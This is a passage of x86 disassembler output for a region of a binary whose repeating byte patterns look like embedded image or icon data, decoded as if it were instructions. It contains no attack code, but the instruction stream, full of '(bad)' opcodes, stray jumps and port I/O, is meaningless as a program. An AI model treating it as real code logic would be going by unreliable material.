  4044f7:	ff                   	(bad)
  4044f8:	ff                   	(bad)
  4044f9:	be fd ff ff be       	mov    $0xbefffffd,%esi
  4044fe:	fd                   	std
  4044ff:	ff                   	(bad)
  404500:	ff                   	(bad)
  404501:	be fd ff ff 66       	mov    $0x66fffffd,%esi
  404506:	c7                   	(bad)
  404507:	ff                   	(bad)
  404508:	ff                   	lcall  (bad)
  404509:	de fe                	fdivrp %st,%st(6)
  40450b:	ff                   	(bad)
  40450c:	ff 6f c8             	ljmp   *-0x38(%edi)
  40450f:	e6 ff                	out    %al,$0xff
  404511:	01 57 7a             	add    %edx,0x7a(%edi)
  404514:	d8 02                	fadds  (%edx)
  404516:	02 02                	add    (%edx),%al
  404518:	70 00                	jo     0x40451a
  40451a:	00 00                	add    %al,(%eax)
  40451c:	1c 00                	sbb    $0x0,%al
  40451e:	00 00                	add    %al,(%eax)
  404520:	01 00                	add    %eax,(%eax)
	...
  404546:	00 00                	add    %al,(%eax)
  404548:	01 00                	add    %eax,(%eax)
  40454a:	8c c4                	mov    %es,%esp
  40454c:	c7                   	(bad)
  40454d:	a8 dc                	test   $0xdc,%al
  40454f:	f5                   	cmc
  404550:	ff a6 eb ff ff 6e    	jmp    *0x6effffeb(%esi)
  404556:	d9 f5                	fprem1
  404558:	ff 2b                	ljmp   *(%ebx)
  40455a:	ae                   	scas   %es:(%edi),%al
  40455b:	dc ff                	fdivr  %st,%st(7)
  40455d:	00 92 cc ff 0f 99    	add    %dl,-0x66f00034(%edx)
  404563:	cf                   	iret
  404564:	ff                   	(bad)
  404565:	3c ac                	cmp    $0xac,%al
  404567:	d9 ff                	fcos
  404569:	69 bf e2 ff 86 cd e9 	imul   $0xe0b3ffe9,-0x3279001e(%edi),%edi
  404570:	ff b3 e0 
  404573:	f2 ff e0             	bnd jmp *%eax
  404576:	f3 fc                	repz cld
  404578:	ff                   	ljmp   (bad)
  404579:	ef                   	out    %eax,(%dx)
  40457a:	f9                   	stc
  40457b:	ff                   	(bad)
  40457c:	ff                   	ljmp   (bad)
  40457d:	ef                   	out    %eax,(%dx)
  40457e:	f9                   	stc
  40457f:	ff                   	(bad)
  404580:	ff e6                	jmp    *%esi
  404582:	fa                   	cli
  404583:	ff                   	(bad)
  404584:	ff c7                	inc    %edi
  404586:	fd                   	std
  404587:	ff                   	(bad)
  404588:	ff c5                	inc    %ebp
  40458a:	fd                   	std
  40458b:	ff                   	(bad)
  40458c:	ff c5                	inc    %ebp
  40458e:	fd                   	std
  40458f:	ff                   	(bad)
  404590:	ff c5                	inc    %ebp
  404592:	fd                   	std
  404593:	ff                   	(bad)
  404594:	ff c5                	inc    %ebp
  404596:	fd                   	std
  404597:	ff                   	(bad)
  404598:	ff c5                	inc    %ebp
  40459a:	fd                   	std
  40459b:	ff                   	(bad)
  40459c:	ff c5                	inc    %ebp
  40459e:	fd                   	std
  40459f:	ff                   	(bad)
  4045a0:	ff c5                	inc    %ebp
  4045a2:	fd                   	std
  4045a3:	ff                   	(bad)
  4045a4:	ff c5                	inc    %ebp
  4045a6:	fd                   	std
  4045a7:	ff                   	(bad)
  4045a8:	ff c5                	inc    %ebp
  4045aa:	fd                   	std
  4045ab:	ff                   	(bad)
  4045ac:	ff c5                	inc    %ebp
  4045ae:	fd                   	std
  4045af:	ff                   	(bad)
  4045b0:	ff c5                	inc    %ebp
  4045b2:	fd                   	std
  4045b3:	ff                   	(bad)
  4045b4:	ff c5                	inc    %ebp
  4045b6:	fd                   	std
  4045b7:	ff                   	(bad)
  4045b8:	ff c5                	inc    %ebp
  4045ba:	fd                   	std
  4045bb:	ff                   	(bad)
  4045bc:	ff c5                	inc    %ebp
  4045be:	fd                   	std
  4045bf:	ff                   	(bad)
  4045c0:	ff c5                	inc    %ebp
  4045c2:	fd                   	std
  4045c3:	ff                   	(bad)
  4045c4:	ff 66 c7             	jmp    *-0x39(%esi)
  4045c7:	ff                   	(bad)
  4045c8:	ff e3                	jmp    *%ebx
  4045ca:	fe                   	(bad)
  4045cb:	ff                   	(bad)
  4045cc:	ff 8e d6 ec ff 00    	decl   0xffecd6(%esi)
  4045d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4045d3:	9a e8 02 02 02 7d 00 	lcall  $0x7d,$0x20202e8
  4045da:	00 00                	add    %al,(%eax)
  4045dc:	21 00                	and    %eax,(%eax)
  4045de:	00 00                	add    %al,(%eax)
  4045e0:	01 00                	add    %eax,(%eax)
	...
  404606:	00 00                	add    %al,(%eax)
  404608:	01 00                	add    %eax,(%eax)
  40460a:	8c c3                	mov    %es,%ebx
  40460c:	c8 d4 f0 ff          	enter  $0xf0d4,$0xff
  404610:	ff 9e ef ff ff 8d    	lcall  *-0x72000011(%esi)
  404616:	ef                   	out    %eax,(%dx)
  404617:	ff                   	(bad)
  404618:	ff 8d ef ff ff 8d    	decl   -0x72000011(%ebp)
  40461e:	ef                   	out    %eax,(%dx)
  40461f:	ff                   	(bad)
  404620:	ff                   	(bad)
  404621:	7c e4                	jl     0x404607
  404623:	f9                   	stc
  404624:	ff 6b d9             	ljmp   *-0x27(%ebx)
  404627:	f2 ff 47 c2          	repnz incl -0x3e(%edi)
  40462b:	e6 ff                	out    %al,$0xff
  40462d:	2c af                	sub    $0xaf,%al
  40462f:	dc ff                	fdivr  %st,%st(7)
  404631:	1b a4 d6 ff 00 92 cc 	sbb    -0x336dff01(%esi,%edx,8),%esp
  404638:	ff 0f                	decl   (%edi)
  40463a:	99                   	cltd
  40463b:	cf                   	iret
  40463c:	ff 4b b3             	decl   -0x4d(%ebx)
  40463f:	dc ff                	fdivr  %st,%st(7)
  404641:	c4 e7 f5 ff          	(bad)
  404645:	ea fb ff ff d1 fd ff 	ljmp   $0xfffd,$0xd1fffffb
  40464c:	ff cf                	dec    %edi
  40464e:	fd                   	std
  40464f:	ff                   	(bad)
  404650:	ff cf                	dec    %edi
  404652:	fd                   	std
  404653:	ff                   	(bad)
  404654:	ff cf                	dec    %edi
  404656:	fd                   	std
  404657:	ff                   	(bad)
  404658:	ff cf                	dec    %edi
  40465a:	fd                   	std
  40465b:	ff                   	(bad)
  40465c:	ff cf                	dec    %edi
  40465e:	fd                   	std
  40465f:	ff                   	(bad)
  404660:	ff cf                	dec    %edi
  404662:	fd                   	std
  404663:	ff                   	(bad)
  404664:	ff cf                	dec    %edi
  404666:	fd                   	std
  404667:	ff                   	(bad)
  404668:	ff cf                	dec    %edi
  40466a:	fd                   	std
  40466b:	ff                   	(bad)
  40466c:	ff cf                	dec    %edi
  40466e:	fd                   	std
  40466f:	ff                   	(bad)
  404670:	ff cf                	dec    %edi
  404672:	fd                   	std
  404673:	ff                   	(bad)
  404674:	ff cf                	dec    %edi
  404676:	fd                   	std
  404677:	ff                   	(bad)
  404678:	ff cf                	dec    %edi
  40467a:	fd                   	std
  40467b:	ff                   	(bad)
  40467c:	ff cf                	dec    %edi
  40467e:	fd                   	std
  40467f:	ff                   	(bad)
  404680:	ff cf                	dec    %edi
  404682:	fd                   	std
  404683:	ff                   	(bad)
  404684:	ff 66 c7             	jmp    *-0x39(%esi)
  404687:	ff                   	(bad)
  404688:	ff                   	ljmp   (bad)
  404689:	e8 fe ff ff ae       	call   0xaf40468c
  40468e:	e4 f2                	in     $0xf2,%al
  404690:	ff 00                	incl   (%eax)
  404692:	76 a4                	jbe    0x404638
  404694:	ee                   	out    %al,(%dx)
  404695:	03 03                	add    (%ebx),%eax
  404697:	03 8b 00 00 00 26    	add    0x26000000(%ebx),%ecx
  40469d:	00 00                	add    %al,(%eax)
  40469f:	00 01                	add    %al,(%ecx)
	...
  4046c5:	00 00                	add    %al,(%eax)
  4046c7:	00 01                	add    %al,(%ecx)
  4046c9:	00 8b c2 c9 d9 f1    	add    %cl,-0xe26363e(%ebx)
  4046cf:	ff                   	(bad)
  4046d0:	ff a4 f3 ff ff 92 f4 	jmp    *-0xb6d0001(%ebx,%esi,8)
  4046d7:	ff                   	(bad)
  4046d8:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  4046de:	f4                   	hlt
  4046df:	ff                   	(bad)
  4046e0:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  4046e6:	f4                   	hlt
  4046e7:	ff                   	(bad)
  4046e8:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  4046ee:	f4                   	hlt
  4046ef:	ff                   	(bad)
  4046f0:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  4046f6:	f4                   	hlt
  4046f7:	ff                   	(bad)
  4046f8:	ff 77 e3             	push   -0x1d(%edi)
  4046fb:	f5                   	cmc
  4046fc:	ff 53 ca             	call   *-0x36(%ebx)
  4046ff:	e9 ff 0f 99 cf       	jmp    0xcfd95703
  404704:	ff c6                	inc    %esi
  404706:	e7 f5                	out    %eax,$0xf5
  404708:	ff                   	ljmp   (bad)
  404709:	ee                   	out    %al,(%dx)
  40470a:	fc                   	cld
  40470b:	ff                   	(bad)
  40470c:	ff                   	lcall  (bad)
  40470d:	d9 fe                	fsin
  40470f:	ff                   	(bad)
  404710:	ff                   	lcall  (bad)
  404711:	d8 fe                	fdivr  %st(6),%st
  404713:	ff                   	(bad)
  404714:	ff                   	lcall  (bad)
  404715:	d8 fe                	fdivr  %st(6),%st
  404717:	ff                   	(bad)
  404718:	ff                   	lcall  (bad)
  404719:	d8 fe                	fdivr  %st(6),%st
  40471b:	ff                   	(bad)
  40471c:	ff                   	lcall  (bad)
  40471d:	d8 fe                	fdivr  %st(6),%st
  40471f:	ff                   	(bad)
  404720:	ff                   	lcall  (bad)
  404721:	d8 fe                	fdivr  %st(6),%st
  404723:	ff                   	(bad)
  404724:	ff                   	lcall  (bad)
  404725:	d8 fe                	fdivr  %st(6),%st
  404727:	ff                   	(bad)
  404728:	ff                   	lcall  (bad)
  404729:	d8 fe                	fdivr  %st(6),%st
  40472b:	ff                   	(bad)
  40472c:	ff                   	lcall  (bad)
  40472d:	d8 fe                	fdivr  %st(6),%st
  40472f:	ff                   	(bad)
  404730:	ff                   	lcall  (bad)
  404731:	d8 fe                	fdivr  %st(6),%st
  404733:	ff                   	(bad)
  404734:	ff                   	lcall  (bad)
  404735:	d8 fe                	fdivr  %st(6),%st
  404737:	ff                   	(bad)
  404738:	ff                   	lcall  (bad)
  404739:	d8 fe                	fdivr  %st(6),%st
  40473b:	ff                   	(bad)
  40473c:	ff                   	lcall  (bad)
  40473d:	d8 fe                	fdivr  %st(6),%st
  40473f:	ff                   	(bad)
  404740:	ff                   	lcall  (bad)
  404741:	d8 fe                	fdivr  %st(6),%st
  404743:	ff                   	(bad)
  404744:	ff 66 c7             	jmp    *-0x39(%esi)
  404747:	ff                   	(bad)
  404748:	ff                   	ljmp   (bad)
  404749:	ee                   	out    %al,(%dx)
  40474a:	fe                   	(bad)
  40474b:	ff                   	(bad)
  40474c:	ff d0                	call   *%eax
  40474e:	f1                   	int1
  40474f:	f9                   	stc
  404750:	ff 00                	incl   (%eax)
  404752:	8c c2                	mov    %es,%edx
  404754:	fb                   	sti
  404755:	03 03                	add    (%ebx),%eax
  404757:	03 96 00 00 00 2f    	add    0x2f000000(%esi),%edx
  40475d:	00 00                	add    %al,(%eax)
  40475f:	00 03                	add    %al,(%ebx)
	...
  404785:	00 00                	add    %al,(%eax)
  404787:	00 01                	add    %al,(%ecx)
  404789:	00 92 cc ff de f3    	add    %dl,-0xc210034(%edx)
  40478f:	ff                   	(bad)
  404790:	ff a9 f8 ff ff 98    	ljmp   *-0x67000008(%ecx)
  404796:	fb                   	sti
  404797:	ff                   	(bad)
  404798:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  40479e:	fb                   	sti
  40479f:	ff                   	(bad)
  4047a0:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  4047a6:	fb                   	sti
  4047a7:	ff                   	(bad)
  4047a8:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  4047ae:	fb                   	sti
  4047af:	ff                   	(bad)
  4047b0:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  4047b6:	fb                   	sti
  4047b7:	ff                   	(bad)
  4047b8:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  4047be:	fb                   	sti
  4047bf:	ff                   	(bad)
  4047c0:	ff 43 c0             	incl   -0x40(%ebx)
  4047c3:	e2 ff                	loop   0x4047c4
  4047c5:	0f 99 cf             	setns  %bh
  4047c8:	ff                   	ljmp   (bad)
  4047c9:	e8 f6 fc ff f5       	call   0xf64044c4
  4047ce:	fd                   	std
  4047cf:	ff                   	(bad)
  4047d0:	ff f0                	push   %eax
  4047d2:	fe                   	(bad)
  4047d3:	ff                   	(bad)
  4047d4:	ff                   	ljmp   (bad)
  4047d5:	ed                   	in     (%dx),%eax
  4047d6:	fd                   	std
  4047d7:	ff                   	(bad)
  4047d8:	ff                   	ljmp   (bad)
  4047d9:	eb fd                	jmp    0x4047d8
  4047db:	ff                   	(bad)
  4047dc:	ff e6                	jmp    *%esi
  4047de:	fe                   	(bad)
  4047df:	ff                   	(bad)
  4047e0:	ff e5                	jmp    *%ebp
  4047e2:	fe                   	(bad)
  4047e3:	ff                   	(bad)
  4047e4:	ff e1                	jmp    *%ecx
  4047e6:	fe                   	(bad)
  4047e7:	ff                   	(bad)
  4047e8:	ff e1                	jmp    *%ecx
  4047ea:	fe                   	(bad)
  4047eb:	ff                   	(bad)
  4047ec:	ff e1                	jmp    *%ecx
  4047ee:	fe                   	(bad)
  4047ef:	ff                   	(bad)
  4047f0:	ff e1                	jmp    *%ecx
  4047f2:	fe                   	(bad)
  4047f3:	ff                   	(bad)
  4047f4:	ff e1                	jmp    *%ecx
  4047f6:	fe                   	(bad)
  4047f7:	ff                   	(bad)
  4047f8:	ff e1                	jmp    *%ecx
  4047fa:	fe                   	(bad)
  4047fb:	ff                   	(bad)
  4047fc:	ff e1                	jmp    *%ecx
  4047fe:	fe                   	(bad)
  4047ff:	ff                   	(bad)
  404800:	ff e1                	jmp    *%ecx
  404802:	fe                   	(bad)
  404803:	ff                   	(bad)
  404804:	ff 66 c7             	jmp    *-0x39(%esi)
  404807:	ff                   	(bad)
  404808:	ff f3                	push   %ebx
  40480a:	ff                   	(bad)
  40480b:	ff                   	(bad)
  40480c:	ff f3                	push   %ebx
  40480e:	ff                   	(bad)
  40480f:	ff                   	(bad)
  404810:	ff 00                	incl   (%eax)
  404812:	92                   	xchg   %eax,%edx
  404813:	cc                   	int3
  404814:	ff 02                	incl   (%edx)
  404816:	02 02                	add    (%edx),%al
  404818:	9e                   	sahf
  404819:	03 03                	add    (%ebx),%eax
  40481b:	03 40 00             	add    0x0(%eax),%eax
  40481e:	00 00                	add    %al,(%eax)
  404820:	0a 00                	or     (%eax),%al
	...
  404846:	00 00                	add    %al,(%eax)
  404848:	01 00                	add    %eax,(%eax)
  40484a:	92                   	xchg   %eax,%edx
  40484b:	cc                   	int3
  40484c:	ff e2                	jmp    *%edx
  40484e:	f4                   	hlt
  40484f:	ff                   	(bad)
  404850:	ff ab fa ff ff 99    	ljmp   *-0x66000006(%ebx)
  404856:	fc                   	cld
  404857:	ff                   	(bad)
  404858:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  40485e:	fc                   	cld
  40485f:	ff                   	(bad)
  404860:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  404866:	fc                   	cld
  404867:	ff                   	(bad)
  404868:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  40486e:	fc                   	cld
  40486f:	ff                   	(bad)
  404870:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  404876:	fc                   	cld
  404877:	ff                   	(bad)
  404878:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  40487e:	fc                   	cld
  40487f:	ff                   	(bad)
  404880:	ff 99 fc ff ff 39    	lcall  *0x39fffffc(%ecx)
  404886:	b9 df ff 10 99       	mov    $0x9910ffdf,%ecx
  40488b:	cf                   	iret
  40488c:	ff                   	(bad)
  40488d:	3f                   	aas
  40488e:	ad                   	lods   %ds:(%esi),%eax
  40488f:	d9 ff                	fcos
  404891:	7d c9                	jge    0x40485c
  404893:	e6 ff                	out    %al,$0xff
  404895:	8d                   	lea    (bad),%ecx
  404896:	cf                   	iret
  404897:	e9 ff bc e3 f2       	jmp    0xf324059b
  40489c:	ff                   	lcall  (bad)
  40489d:	db f0                	fcomi  %st(0),%st
  40489f:	f9                   	stc
  4048a0:	ff                   	(bad)
  4048a1:	fa                   	cli
  4048a2:	fe                   	(bad)
  4048a3:	ff                   	(bad)
  4048a4:	ff                   	(bad)
  4048a5:	fa                   	cli
  4048a6:	fe                   	(bad)
  4048a7:	ff                   	(bad)
  4048a8:	ff f7                	push   %edi
  4048aa:	fe                   	(bad)
  4048ab:	ff                   	(bad)
  4048ac:	ff f4                	push   %esp
  4048ae:	fe                   	(bad)
  4048af:	ff                   	(bad)
  4048b0:	ff f1                	push   %ecx
  4048b2:	ff                   	(bad)
  4048b3:	ff                   	(bad)
  4048b4:	ff f0                	push   %eax
  4048b6:	ff                   	(bad)
  4048b7:	ff                   	(bad)
  4048b8:	ff                   	ljmp   (bad)
  4048b9:	ed                   	in     (%dx),%eax
  4048ba:	fe                   	(bad)
  4048bb:	ff                   	(bad)
  4048bc:	ff                   	ljmp   (bad)
  4048bd:	eb fe                	jmp    0x4048bd
  4048bf:	ff                   	(bad)
  4048c0:	ff                   	ljmp   (bad)
  4048c1:	ea fe ff ff 66 c7 ff 	ljmp   $0xffc7,$0x66fffffe
  4048c8:	ff                   	(bad)
  4048c9:	f8                   	clc
  4048ca:	ff                   	(bad)
  4048cb:	ff                   	(bad)
  4048cc:	ff                   	(bad)
  4048cd:	f8                   	clc
  4048ce:	ff                   	(bad)
  4048cf:	ff                   	(bad)
  4048d0:	ff 10                	call   *(%eax)
  4048d2:	99                   	cltd
  4048d3:	cf                   	iret
  4048d4:	ff 01                	incl   (%ecx)
  4048d6:	34 48                	xor    $0x48,%al
  4048d8:	b9 02 02 02 4d       	mov    $0x4d020202,%ecx
  4048dd:	00 00                	add    %al,(%eax)
  4048df:	00 0e                	add    %cl,(%esi)
	...
  404905:	00 00                	add    %al,(%eax)
  404907:	00 01                	add    %al,(%ecx)
  404909:	00 92 cc ff e7 f6    	add    %dl,-0x9180034(%edx)
  40490f:	ff                   	(bad)
  404910:	ff c0                	inc    %eax
  404912:	f9                   	stc
  404913:	ff                   	(bad)
  404914:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  40491a:	fc                   	cld
  40491b:	ff                   	(bad)
  40491c:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  404922:	fc                   	cld
  404923:	ff                   	(bad)
  404924:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  40492a:	fc                   	cld
  40492b:	ff                   	(bad)
  40492c:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  404932:	fc                   	cld
  404933:	ff                   	(bad)
  404934:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  40493a:	fc                   	cld
  40493b:	ff                   	(bad)
  40493c:	ff 99 fc ff ff a3    	lcall  *-0x5c000004(%ecx)
  404942:	fb                   	sti
  404943:	ff                   	(bad)
  404944:	ff 99 fc ff ff 7c    	lcall  *0x7cfffffc(%ecx)
  40494a:	e8 f5 ff 60 d4       	call   0xd4a14944
  40494f:	ec                   	in     (%dx),%al
  404950:	ff 4d c7             	decl   -0x39(%ebp)
  404953:	e6 ff                	out    %al,$0xff
  404955:	30 b3 dc ff 26 ad    	xor    %dh,-0x52d90024(%ebx)
  40495b:	d9 ff                	fcos
  40495d:	00 92 cc ff 00 92    	add    %dl,-0x6dff0034(%edx)
  404963:	cc                   	int3
  404964:	ff 2f                	ljmp   *(%edi)
  404966:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404967:	d6                   	salc
  404968:	ff                   	(bad)
  404969:	3f                   	aas
  40496a:	ad                   	lods   %ds:(%esi),%eax
  40496b:	d9 ff                	fcos
  40496d:	7e c9                	jle    0x404938
  40496f:	e6 ff                	out    %al,$0xff
  404971:	9e                   	sahf
  404972:	d5 ec                	aad    $0xec
  404974:	ff                   	(bad)
  404975:	bd e3 f2 ff ed       	mov    $0xedfff2e3,%ebp
  40497a:	f7 fc                	idiv   %esp
  40497c:	ff                   	(bad)
  40497d:	fd                   	std
  40497e:	fe                   	(bad)
  40497f:	ff                   	(bad)
  404980:	ff                   	(bad)
  404981:	fd                   	std
  404982:	fe                   	(bad)
  404983:	ff                   	(bad)
  404984:	ff d7                	call   *%edi
  404986:	f1                   	int1
  404987:	ff                   	(bad)
  404988:	ff                   	(bad)
  404989:	fc                   	cld
  40498a:	ff                   	(bad)
  40498b:	ff                   	(bad)
  40498c:	ff                   	(bad)
  40498d:	fc                   	cld
  40498e:	ff                   	(bad)
  40498f:	ff                   	(bad)
  404990:	ff                   	(bad)
  404991:	3f                   	aas
  404992:	ad                   	lods   %ds:(%esi),%eax
  404993:	d9 ff                	fcos
  404995:	02 41 5a             	add    0x5a(%ecx),%al
  404998:	b8 03 03 03 49       	mov    $0x49030303,%eax
  40499d:	00 00                	add    %al,(%eax)
  40499f:	00 0e                	add    %cl,(%esi)
	...
  4049c9:	00 8f c8 a2 94 d2    	add    %cl,-0x2d6b5d38(%edi)
  4049cf:	ec                   	in     (%dx),%al
  4049d0:	ff e7                	jmp    *%edi
  4049d2:	f8                   	clc
  4049d3:	ff                   	(bad)
  4049d4:	ff 9e fc ff ff 99    	lcall  *-0x66000004(%esi)
  4049da:	fc                   	cld
  4049db:	ff                   	(bad)
  4049dc:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  4049e2:	fc                   	cld
  4049e3:	ff                   	(bad)
  4049e4:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  4049ea:	fc                   	cld
  4049eb:	ff                   	(bad)
  4049ec:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  4049f2:	fc                   	cld
  4049f3:	ff                   	(bad)
  4049f4:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  4049fa:	fc                   	cld
  4049fb:	ff                   	(bad)
  4049fc:	ff a9 fb ff ff e7    	ljmp   *-0x18000005(%ecx)
  404a02:	f8                   	clc
  404a03:	ff                   	(bad)
  404a04:	ff                   	ljmp   (bad)
  404a05:	ec                   	in     (%dx),%al
  404a06:	f8                   	clc
  404a07:	ff                   	(bad)
  404a08:	ff                   	lcall  (bad)
  404a09:	dc f9                	fdivr  %st,%st(1)
  404a0b:	ff                   	(bad)
  404a0c:	ff d7                	call   *%edi
  404a0e:	fa                   	cli
  404a0f:	ff                   	(bad)
  404a10:	ff c3                	inc    %ebx
  404a12:	fa                   	cli
  404a13:	ff                   	(bad)
  404a14:	ff                   	(bad)
  404a15:	b8 fb ff ff ae       	mov    $0xaefffffb,%eax
  404a1a:	fb                   	sti
  404a1b:	ff                   	(bad)
  404a1c:	ff 9e fc ff ff 8f    	lcall  *-0x70000004(%esi)
  404a22:	f5                   	cmc
  404a23:	fc                   	cld
  404a24:	ff 73 e2             	push   -0x1e(%ebx)
  404a27:	f2 ff 60 d4          	bnd jmp *-0x2c(%eax)
  404a2b:	ec                   	in     (%dx),%al
  404a2c:	ff 4d c7             	decl   -0x39(%ebp)
  404a2f:	e6 ff                	out    %al,$0xff
  404a31:	30 b3 dc ff 26 ad    	xor    %dh,-0x52d90024(%ebx)
  404a37:	d9 ff                	fcos
  404a39:	00 92 cc ff 00 92    	add    %dl,-0x6dff0034(%edx)
  404a3f:	cc                   	int3
  404a40:	ff 40 ae             	incl   -0x52(%eax)
  404a43:	d9 ff                	fcos
  404a45:	50                   	push   %eax
  404a46:	b4 dc                	mov    $0xdc,%ah
  404a48:	ff 80 c9 e6 ff af    	incl   -0x50001937(%eax)
  404a4e:	dd ef                	fucomp %st(7)
  404a50:	ff 30                	push   (%eax)
  404a52:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404a53:	d6                   	salc
  404a54:	ff 01                	incl   (%ecx)
  404a56:	64 8c a4 00 00 00 26 	mov    %fs,%fs:0x260000(%eax,%eax,1)
  404a5d:	00 
  404a5e:	00 00                	add    %al,(%eax)
  404a60:	06                   	push   %es
	...
  404a89:	00 8d c6 21 1e 9f    	add    %cl,-0x60e1de3a(%ebp)
  404a8f:	d2 ff                	sar    %cl,%bh
  404a91:	e2 f3                	loop   0x404a86
  404a93:	fc                   	cld
  404a94:	ff c5                	inc    %ebp
  404a96:	fb                   	sti
  404a97:	ff                   	(bad)
  404a98:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  404a9e:	fc                   	cld
  404a9f:	ff                   	(bad)
  404aa0:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  404aa6:	fc                   	cld
  404aa7:	ff                   	(bad)
  404aa8:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  404aae:	fc                   	cld
  404aaf:	ff                   	(bad)
  404ab0:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  404ab6:	fc                   	cld
  404ab7:	ff                   	(bad)
  404ab8:	ff 9f fc ff ff e1    	lcall  *-0x1e000004(%edi)
  404abe:	fa                   	cli
  404abf:	ff                   	(bad)
  404ac0:	ff c4                	inc    %esp
  404ac2:	e6 f5                	out    %al,$0xf5
  404ac4:	ff                   	(bad)
  404ac5:	3c ac                	cmp    $0xac,%al
  404ac7:	d9 ff                	fcos
  404ac9:	4b                   	dec    %ebx
  404aca:	b2 dc                	mov    $0xdc,%dl
  404acc:	ff                   	(bad)
  404acd:	79 c6                	jns    0x404a95
  404acf:	e6 ff                	out    %al,$0xff
  404ad1:	88 cd                	mov    %cl,%ch
  404ad3:	e9 ff b5 e0 f2       	jmp    0xf32100d7
  404ad8:	ff d3                	call   *%ebx
  404ada:	ed                   	in     (%dx),%eax
  404adb:	f9                   	stc
  404adc:	ff f1                	push   %ecx
  404ade:	fa                   	cli
  404adf:	ff                   	(bad)
  404ae0:	ff f1                	push   %ecx
  404ae2:	fa                   	cli
  404ae3:	ff                   	(bad)
  404ae4:	ff                   	lcall  (bad)
  404ae5:	db fa                	(bad)
  404ae7:	ff                   	(bad)
  404ae8:	ff d0                	call   *%eax
  404aea:	fa                   	cli
  404aeb:	ff                   	(bad)
  404aec:	ff c5                	inc    %ebp
  404aee:	fb                   	sti
  404aef:	ff                   	(bad)
  404af0:	ff b5 fb ff ff aa    	push   -0x55000005(%ebp)
  404af6:	fb                   	sti
  404af7:	ff                   	(bad)
  404af8:	ff 99 fc ff ff 86    	lcall  *-0x79000004(%ecx)
  404afe:	ee                   	out    %al,(%dx)
  404aff:	f9                   	stc
  404b00:	ff 73 e2             	push   -0x1e(%ebx)
  404b03:	f2 ff 00             	repnz incl (%eax)
  404b06:	92                   	xchg   %eax,%edx
  404b07:	cc                   	int3
  404b08:	ff 01                	incl   (%ecx)
  404b0a:	5f                   	pop    %edi
  404b0b:	83 c8 00             	or     $0x0,%eax
  404b0e:	89 be cd 00 89 bf    	mov    %edi,-0x4076ff33(%esi)
  404b14:	aa                   	stos   %al,%es:(%edi)
  404b15:	00 3f                	add    %bh,(%edi)
  404b17:	58                   	pop    %eax
  404b18:	25 00 00 00 07       	and    $0x7000000,%eax
  404b1d:	00 00                	add    %al,(%eax)
  404b1f:	00 01                	add    %al,(%ecx)
	...
  404b4d:	00 8e c7 a3 7b c7    	add    %cl,-0x38845c39(%esi)
  404b53:	e6 ff                	out    %al,$0xff
  404b55:	ef                   	out    %eax,(%dx)
  404b56:	fb                   	sti
  404b57:	ff                   	(bad)
  404b58:	ff 9f fc ff ff 99    	lcall  *-0x66000004(%edi)
  404b5e:	fc                   	cld
  404b5f:	ff                   	(bad)
  404b60:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  404b66:	fc                   	cld
  404b67:	ff                   	(bad)
  404b68:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  404b6e:	fc                   	cld
  404b6f:	ff                   	(bad)
  404b70:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  404b76:	fc                   	cld
  404b77:	ff                   	(bad)
  404b78:	ff d3                	call   *%ebx
  404b7a:	fc                   	cld
  404b7b:	ff                   	(bad)
  404b7c:	ff e6                	jmp    *%esi
  404b7e:	f5                   	cmc
  404b7f:	fc                   	cld
  404b80:	ff 20                	jmp    *(%eax)
  404b82:	9a cb f9 01 2e 40 68 	lcall  $0x6840,$0x2e01f9cb
  404b89:	00 6a 94             	add    %ch,-0x6c(%edx)
  404b8c:	42                   	inc    %edx
  404b8d:	00 84 b8 47 00 8a c0 	add    %al,-0x3f75ffb9(%eax,%edi,4)
  404b94:	77 00                	ja     0x404b96
  404b96:	89 be 89 00 8d c6    	mov    %edi,-0x3972ff77(%esi)
  404b9c:	c5 00                	lds    (%eax),%eax
  404b9e:	8e c6                	mov    %esi,%es
  404ba0:	d5 1f                	aad    $0x1f
  404ba2:	9f                   	lahf
  404ba3:	d2 ff                	sar    %cl,%bh
  404ba5:	3d ad d9 ff 6b       	cmp    $0x6bffd9ad,%eax
  404baa:	c0 e2 ff             	shl    $0xff,%dl
  404bad:	7b c7                	jnp    0x404b76
  404baf:	e6 ff                	out    %al,$0xff
  404bb1:	a8 db                	test   $0xdb,%al
  404bb3:	ef                   	out    %eax,(%dx)
  404bb4:	ff                   	(bad)
  404bb5:	b8 e1 f2 ff f5       	mov    $0xf5fff2e1,%eax
  404bba:	fc                   	cld
  404bbb:	ff                   	(bad)
  404bbc:	ff                   	ljmp   (bad)
